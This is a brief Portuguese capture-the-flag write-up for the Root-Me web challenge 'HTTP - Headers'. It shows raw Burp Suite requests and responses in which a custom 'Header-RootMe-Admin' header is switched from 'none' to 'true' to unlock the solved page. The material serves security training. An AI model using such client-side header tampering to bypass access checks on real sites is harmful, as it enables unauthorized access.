# HTTP - Headers

Capturando a resposta da requisição com Burp Suit há um parâmetro adicional:
<pre>HTTP/1.1 200 OK
Server: nginx
Date: Mon, 03 Feb 2020 20:34:16 GMT
Content-Type: text/html; charset=UTF-8
Connection: close
Vary: Accept-Encoding
Header-RootMe-Admin: none</pre>

Então podemos adiciona-lo na requisição:
<pre>GET /web-serveur/ch5/ HTTP/1.1
Host: challenge01.root-me.org
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
Header-RootMe-Admin: true</pre>

Resposta:
<pre>HTTP/1.1 200 OK
Server: nginx
Date: Mon, 03 Feb 2020 20:49:40 GMT
Content-Type: text/html; charset=UTF-8
Connection: close
Vary: Accept-Encoding
Header-RootMe-Admin: none
Content-Length: 359

<html>
<body><link rel='stylesheet' property='stylesheet' id='s' type='text/css' href='/template/s.css' media='all' /><iframe id='iframe' src='https://www.root-me.org/?page=externe_header'></iframe>
<p>Content is not the only part of an HTTP response!</p>
<p>You dit it ! You can validate the challenge with the password (password_here)</p></body>
</html></pre>
